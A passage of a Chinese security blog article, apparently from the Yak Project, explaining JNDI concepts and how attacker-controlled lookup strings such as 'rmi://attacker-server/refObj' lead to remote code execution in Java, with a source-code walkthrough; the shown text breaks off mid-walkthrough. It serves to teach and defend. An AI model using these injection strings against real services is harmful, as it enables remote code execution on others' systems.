---
title: JNDI的基础利用总结（上篇）
url: https://mp.weixin.qq.com/s?__biz=Mzk0MTM4NzIxMQ==&mid=2247494685&idx=1&sn=604b086012a8ae8aa2ce16a374d3a6cd&chksm=c2d190b9f5a619af36a2223f5b51adccec639e5b64db1c0661574cb446fa4c8f016852752777&scene=58&subscene=0#rd
source: Yak Project
date: 2023-03-24
fetch_date: 2025-10-04T10:30:27.097695
---

# JNDI的基础利用总结（上篇）

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/f7AtEgJhMZeHGezz1CUrHptGTKsWtGk1Sm0XUvMLsn5Ric05270o8LU3ia1XAbBzYG3ialMmSrksNw5q1AQ4BnnEQ/0?wx_fmt=jpeg)

# JNDI的基础利用总结（上篇）

雨过天晴

Yak Project

![](https://mmbiz.qpic.cn/mmbiz_gif/f7AtEgJhMZfSpFpvkIFZmQIErFibib1uiaOsLXZKbkicRsicXVN3QYGac0xrqKu7Pxo1UO0YLMiboTs0WCcBUO3qOhhw/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZeGqn6Au1o1Fc4QmwFo8FAsxcUjaVEdPnaSeVX18Yn4DNvwH74ss20LaNk1ueEallG6AdA0VuU8Iw/640?wx_fmt=png)

**ps**：在java版本大于1.8u191之后版本存在trustCodebaseURL的限制，只能信任已有的codebase地址，不再能够从指定codebase中下载字节码

PART.1

JNDI常见sink点

```
Hashtable env = new Hashtable();env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");//com.sun.jndi.rmi.registry.RegistryContextFactory 是RMI Registry Service Provider对应的Factoryenv.put(Context.PROVIDER_URL, "rmi://host:8080");Context ctx = new InitialContext(env);Object local_obj = ctx.lookup("rmi://host:8080/test");
```

注：InitialContext 是一个实现了 Context接口的类。使用这个类作为JNDI命名服务的入口点。创建InitialContext 对象需要传入一组属性，参数类型为java.util.Hashtable或其子类之一。

这里的意思就是说当我们执行InititalContext.lookup(evil\_input)时,这个恶意输入可以覆写上文的值，从而在我们的恶意服务器执行lookup操作，这里我们通过让恶意rmi服务器返回一个恶意的Reference，在客户端收到后

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZeGqn6Au1o1Fc4QmwFo8FAsicZwkQAXYZvWWD52UpXKDPH4ZQicia32Zyicm4UreyCBRIql0cFdDGxLibA/640?wx_fmt=png)

使用ObjectFactory对拿到的引用对象执行实例化因而RCE

PART.2

JNDI漏洞利用分析

**JNDI中涉及的概念**

JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory Service。JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。

**Naming Service** ：命名服务是将名称与值相关联的实体，称为"绑定"。它提供了一种使用"find"或"search"操作来根据名称查找对象的便捷方式。 就像DNS一样，通过命名服务器提供服务，大部分的J2EE服务器都含有命名服务器 。例如上面说到的RMI Registry就是使用的Naming  Service。

**Directory Service ：**是一种特殊的Naming Service，它允许存储和搜索"目录对象"，一个目录对象不同于一个通用对象，目录对象可以与属性关联，因此，目录服务提供了对象属性进行操作功能的扩展。一个目录是由相关联的目录对象组成的系统，一个目录类似于数据库，不过它们通常以类似树的分层结构进行组织。可以简单理解成它是一种简化的RDBMS系统，通过目录具有的属性保存一些简单的信息。下面说到的LDAP就是目录服务。

**几个重要的JNDI概念** ：

* **原子名**是一个简单、基本、不可分割的组成部分
* **绑定**是名称与对象的关联，每个绑定都有一个不同的原子名
* **复合名**包含零个或多个原子名，即由多个绑定组成
* **上下文**是包含零个或多个绑定的对象，每个绑定都有一个不同的原子名
* 命名系统是一组关联的上下文
* 名称空间是命名系统中包含的所有名称
* 探索名称空间的起点称为初始上下文
* **要获取初始上下文，需要使用初始上下文工厂**

使用JNDI的好处 ：

JNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置，也就是各种bind。比如在RMI服务器端上可以不直接使用Registry进行bind，而使用JNDI统一管理，当然JNDI底层应该还是调用的Registry的bind，但好处JNDI提供的是统一的配置接口；在客户端也可以直接通过类似URL的形式来访问目标服务，可以看后面提到的 JNDI动态协议转换 。把RMI换成其他的例如LDAP、CORBA等也是同样的道理。![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZeGqn6Au1o1Fc4QmwFo8FAs0QUf4FPNmqP4pmZ9wmgZB4u3wZF3oxjYsWMvTpRU9JzEKnA3QAp4Eg/640?wx_fmt=png)

**Naming是个什么东西**

简单来说Naming类提供了方法来存储和获取远程对象在远程对象注册中心(registery)的引用(reference)。Naming类中的每个方法都会接受一个名为Name的String类型参数，Name这个参数是一个URL格式的字符串但是不带有scheme(//host:port/name)。其中的host就是远程或者本地的注册中心所在的host。不指定的话默认为localhost，端口不指定的话默认就是1099(一般是RMI端口)。

**javax.naming中的Context接口**

在naming包中存在Context，context这个概念，context由一组名字和对象的绑定组成。Context是执行lookup binding unbinding renaming对象中的核心接口。

就拿lookup()这个操作来说，你给lookup方法传入一个名字，那么就会返回与这个名字相绑定的对象，例如

```
Printer printer = (Printer)ctx.lookup("treekiller"); printer.print(report);
```

**javax.naming中的Name接口**

在Context接口中的所有naming方法，都有两个方法重载，一个是接受一个Name作为参数，另一个接受一个string作为参数。

Name是一个接口，代表了一个宽泛的name概念，也就是一个有序的由0个或多个组件构成的。对于Context中的naming方法，这个Name就可以被用于表示复合名称，因此可以给一个Object命名一个跨越多个namespace的名称。

对于这两个方法重载，接受Name参数的方法重载对于需要对名称进行操作的场景会比较有用，例如组合，比较等等。而接受string作为参数的则对于简单应用来说用的更多，尤其是在仅仅只是想读取名称，或者根据名称去lookup一个对应对象的场景下。

**javax.naming中的binding类**

Binding类代表了一个名称与对象间的绑定，他是一个包含了命名，被绑定对象的类名，和被绑定对象本身的元组。

这个Binding类其实是NameClassPair的子类，而NameClassPair仅仅包含了命名和对象的类名。NameClassPair在你仅仅想要拿到objcet信息的时候很有用，因为这样你就不必花费额外支持来去获取用不到的这个object本身。

**javax.naming中的reference类**

对象会以不同形式被存储在命名和目录服务中。如果object存储方支持存储java对象，那么他就可能会去以这个object的序列化形式去存储这个object。然而有的命名和目录服务可能不是java写的或者不支持以序列化形式存储这个object。同时，对于目录中的一些object，不单单是Java而是一组应用会去访问这些object，在这种场景下，一个序列化的java object也许就不是最合适的表现方式了。JNDI中定义的reference，就由Reference类去表示，其中包含了如何重建一个相同object的拷贝的信息。JNDI将会去尝试，把lookup拿到的reference去转换成其所代表的java object。这样对于JNDI的客户端来说，具体的存储 转换细节就会被屏蔽，对于客户端来说目录中存放的就是java object。

**javax.naming中的InitialContext类**

在JNDI中，所有的命名和目录操作都是在一个相对的context场景下完成的。InitialContext为这些操作提供了一个初始点，一旦拿到一个initial context，就可以去lookup其他的context和object

PART.3

JNDI范例

JNDI与RMI配合使用：

```
Hashtable env = new Hashtable();env.put(Context.INITIAL_CONTEXT_FACTORY,        "com.sun.jndi.rmi.registry.RegistryContextFactory");env.put(Context.PROVIDER_URL,        "rmi://localhost:9999");Context ctx = new InitialContext(env);
//将名称refObj与一个对象绑定，这里底层也是调用的rmi的registry去绑定ctx.bind("refObj", new RefObject());
//通过名称查找对象ctx.lookup("refObj");
```

JNDI与LDAP配合使用：

```
Hashtable env = new Hashtable();env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");env.put(Context.PROVIDER_URL, "ldap://localhost:1389");
DirContext ctx = new InitialDirContext(env);
//通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称cn=foo,dc=test,dc=org绑定了Object local_obj = ctx.lookup("cn=foo,dc=test,dc=org");
```

#### **JNDI动态协议转换**

上面的两个例子都手动设置了对应服务的工厂以及对应服务的PROVIDER\_URL，但是JNDI是能够进行动态协议转换的。

例如：

```
Context ctx = new InitialContext();ctx.lookup("rmi://attacker-server/refObj");//ctx.lookup("ldap://attacker-server/cn=bar,dc=test,dc=org");//ctx.lookup("iiop://attacker-server/bar");
```

上面没有设置对应服务的工厂以及PROVIDER\_URL，JNDI根据传递的URL协议自动转换与设置了对应的工厂与PROVIDER\_URL。

再如下面的：

```
Hashtable env = new Hashtable();env.put(Context.INITIAL_CONTEXT_FACTORY,        "com.sun.jndi.rmi.registry.RegistryContextFactory");env.put(Context.PROVIDER_URL,        "rmi://localhost:9999");Context ctx = new InitialContext(env);
String name = "ldap://attacker-server/cn=bar,dc=test,dc=org";//通过名称查找对象ctx.lookup(name);
```

**即使服务端提前设置了工厂与PROVIDER\_URL也不要紧，如果在lookup时参数能够被攻击者控制，同样会根据攻击者提供的URL进行动态转换。**

PART.4

JNDI原理探索

为什么JNDI可以被利用，我们先拿一个典型的恶意利用sink点作为样例进行分析

```
import javax.naming.Context;import javax.naming.InitialContext;
public class main {    public static void main(String[] args) throws Exception{            Context context = new InitialContext();            context.lookup("ldap://host:1389/SimpleCommand");    }}
```

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZeGqn6Au1o1Fc4QmwFo8FAs1drggK2Sp53nX1j17MxEiaGl9JCmdCtbWZus8s8AM8Ob5Ek9fDibo3Fg/640?wx_fmt=png)

#### **在不传入env来指定ContextFactory时，initialContext()是怎么决定用什么处理查询内容的？**

这里细分到底用哪个context去lookup时调用了函数getURLOrDefaultInitCtx()方法，并且把传入的查询字符串传入作为参数。

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZeGqn6Au1o1Fc4QmwFo8FAskDOibPDpH4pupUibUW5XJXicEdWnAUZph0R3ErLmA4HGntf3hOibNsjgCQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZeGqn6Au1o1Fc4QmwFo8FAsUtqZdNQncs85O3Da5Q2z3oc4n1qicCWxIDPuI02lnqsia8hQwC2tUgtA/640?wx_fmt=png)

上面那个getDefaultInitCtx默认是null，不用管。这里我们传入的URL被解析出scheme为ldap。接着便会根据这个scheme尝试去从NamingManager中拿对应的URLContext，这里的myProps就是我们构造InitialContext时传入的env HashTable经过处理后存储的内容，此处因为没传入env，所以为null

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZeGqn6Au1o1Fc4QmwFo8FAs0y69oOOBQkAuYXUYYOHQmibicERWpr1MibRdpNIINKHzUPQyr2nXNYWpQ/640?wx_fmt=png)

继续跟进 Context ctx = NamingManager.getURLContext(scheme, myProps);

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZeGqn6Au1o1Fc4QmwFo8FAsPxwWFPBNMNBxicVpOqmPDzqSrARogJll1O8ktUTiakWsWU03hLD6zVvw/640?wx_fmt=png)

这一步便会决定到底用啥解析传入的lookup的url，这里根据预先定义的常量和传入的scheme，调用对应的Factory

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZeGqn6Au1o1Fc4QmwFo8FAsyCxGFFV5WparQicDGEAvIjtT2awu6SWeekDjadLZdZM6MAV8icib7zx6w/640?wx_fmt=png)

确定加载的类名

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZeGqn6Au1o1Fc4QmwFo8FAscicO9RDSpYg7t8ichElaI0nfjuM1IELHBz4X9dr0bc8POCPV5fcyO5dQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZeGqn6Au1o1Fc4QmwFo8FAsG2MMAwpDDjA9TMV6LbDZBq8c0mmyMEGXpTOn2UicyMlbpIiblAXrwPUQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZeGqn6Au1o1Fc4QmwFo8FAsngHqEKibibfFtWR3luCkxr1nkaWINbqSgnfFopUib18VrIKhicqYjicibJ0w/640?wx_fmt=png)

经过逐级返回回到最初点

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZeGqn6Au1o1Fc4QmwFo8FAs4hrGicxtTk5mKT9NTRLWpEWWVRb8tMyOLk5AX...